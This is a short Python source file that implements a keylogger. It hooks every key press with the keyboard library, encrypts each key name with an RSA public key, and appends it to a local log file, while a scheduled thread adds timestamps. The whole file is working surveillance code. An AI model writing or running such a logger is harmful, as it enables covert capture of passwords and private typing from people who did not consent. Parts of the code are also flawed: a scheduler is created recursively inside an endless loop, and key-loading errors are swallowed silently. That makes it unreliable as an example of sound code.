#! Add import statements in a try-catch block
import keyboard
import time
from apscheduler.schedulers.blocking import BlockingScheduler
import threading
import rsa

'''
Add time to logs
[ time.asctime(time.gmtime()) ]
'''


class Keylogger:
    def __init__(self) -> None:
        self.log_file = 'key_logs.txt'
        keyboard.on_press(self.on_press)

        delayed_thread = threading.Thread(target=self.BreakTime)
        delayed_thread.start()

        keyboard.wait()

    def find_keys(self):
        try:
            file = open('public.pem','rb')
            return rsa.PublicKey.load_pkcs1(file.read())
        except:
            print('[-] Public key does not exist.')



    def encrypt(self, text:str):
        key = self.find_keys()
        enc_msg = rsa.encrypt(text.encode(), key)
        return enc_msg

    def on_press(self, event):
        with open(self.log_file, 'a') as logf:
            logf.write(str(self.encrypt(f"{event.name}\t")))

    def BreakTime(self):
        while True:
            print('[+]  Adding time log to file')
            with open(self.log_file, 'a') as logf:
                logf.write(str(self.encrypt(f"\n[ {time.asctime(time.gmtime())} ]\n")))
            # time.sleep(43200)  # 43200
            scheduler = BlockingScheduler()
            scheduler.add_job(self.BreakTime, "interval", hours=0.0028)
            scheduler.start()
    

Keylogger()
